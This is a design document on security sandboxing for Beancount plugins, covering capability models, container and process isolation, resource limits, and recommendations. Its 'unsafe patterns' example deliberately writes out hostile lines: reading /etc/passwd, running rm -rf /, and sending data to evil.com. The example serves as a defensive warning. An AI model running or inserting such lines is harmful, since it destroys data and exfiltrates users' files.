# Beancount Plugin Sandboxing

This document specifies security considerations for Beancount plugins.

## Overview

Plugin sandboxing controls:
- What plugins can access
- Resource limits
- Security boundaries

## Security Model

### Current State (Python Beancount)

Python beancount does NOT sandbox plugins:
- Full Python access
- File system access
- Network access
- System calls

**Warning**: Only run trusted plugins.

### Recommended Practices

1. Review plugin source code
2. Use plugins from trusted sources
3. Run in isolated environment
4. Limit file system access

## Proposed Sandboxing

### Capability-Based Model

```python
@plugin(
    capabilities=['read_entries', 'write_entries'],
    deny=['filesystem', 'network']
)
def sandboxed_plugin(entries, options_map):
    pass
```

### Capability Levels

| Capability | Description |
|------------|-------------|
| `read_entries` | Read input entries |
| `write_entries` | Return modified entries |
| `read_options` | Access options_map |
| `read_files` | Read other files |
| `network` | Network access |
| `system` | System calls |

## Implementation Strategies

### Container Isolation

Run plugins in containers:

```bash
docker run --rm \
    --read-only \
    --network none \
    beancount-plugin plugin.py
```

### Process Isolation

Separate process per plugin:

```python
def run_sandboxed(plugin_path, entries):
    # Fork process
    # Drop privileges
    # Execute plugin
    # Collect results
```

### WASM Sandboxing

Compile to WebAssembly:

```javascript
const plugin = await loadWasmPlugin('plugin.wasm');
const result = plugin.process(entries);
```

## Resource Limits

### Memory Limits

```python
resource.setrlimit(
    resource.RLIMIT_AS,
    (max_memory_bytes, max_memory_bytes)
)
```

### Time Limits

```python
signal.alarm(timeout_seconds)
try:
    result = plugin(entries, options)
finally:
    signal.alarm(0)
```

### Entry Limits

```python
MAX_ENTRIES = 100000
if len(entries) > MAX_ENTRIES:
    raise PluginError("Too many entries")
```

## Validation Requirements

### Input Validation

```python
def validate_plugin_output(entries, errors):
    for entry in entries:
        # Verify entry structure
        assert hasattr(entry, 'meta')
        assert hasattr(entry, 'date')

    for error in errors:
        # Verify error structure
        assert hasattr(error, 'message')
```

### Type Checking

```python
from typing import List, Tuple
from beancount.core.data import Directive

def plugin(
    entries: List[Directive],
    options_map: dict
) -> Tuple[List[Directive], List]:
    pass
```

## Security Recommendations

### For Users

1. **Review plugins** before use
2. **Trusted sources** only
3. **Isolated environments** for untrusted
4. **Regular updates** for security fixes
5. **Monitor behavior** for anomalies

### For Plugin Authors

1. **Minimal permissions** - Request only needed
2. **Input validation** - Validate all input
3. **No secrets** - Don't hardcode credentials
4. **Document access** - State what's accessed
5. **Error handling** - Fail safely

### For Implementations

1. **Sandbox by default** - Opt-in for capabilities
2. **Clear boundaries** - Document security model
3. **Audit logging** - Log plugin actions
4. **Version pinning** - Pin plugin versions
5. **Signature verification** - Verify plugin integrity

## Examples

### Safe Plugin Pattern

```python
def safe_plugin(entries, options_map):
    """
    A safely-written plugin that:
    - Only reads entries
    - Only returns modified entries
    - No external access
    """
    new_entries = []
    errors = []

    for entry in entries:
        try:
            processed = process_entry(entry)
            new_entries.append(processed)
        except Exception as e:
            errors.append(new_error(
                entry.meta,
                str(e),
                entry
            ))

    return new_entries, errors
```

### Unsafe Patterns to Avoid

```python
# DON'T DO THIS:
import os
import subprocess

def unsafe_plugin(entries, options_map):
    # Arbitrary file access
    with open('/etc/passwd') as f:
        data = f.read()

    # System commands
    subprocess.run(['rm', '-rf', '/'])

    # Network access
    import requests
    requests.get('http://evil.com/steal?data=...')
```

## Future Directions

1. **Native sandboxing** - Built-in capability system
2. **WASM plugins** - Language-agnostic sandboxing
3. **Plugin signatures** - Verified plugin sources
4. **Formal verification** - Prove plugin properties

## See Also

- [Plugin Specification](spec.md)
- [Plugin Hooks](hooks.md)
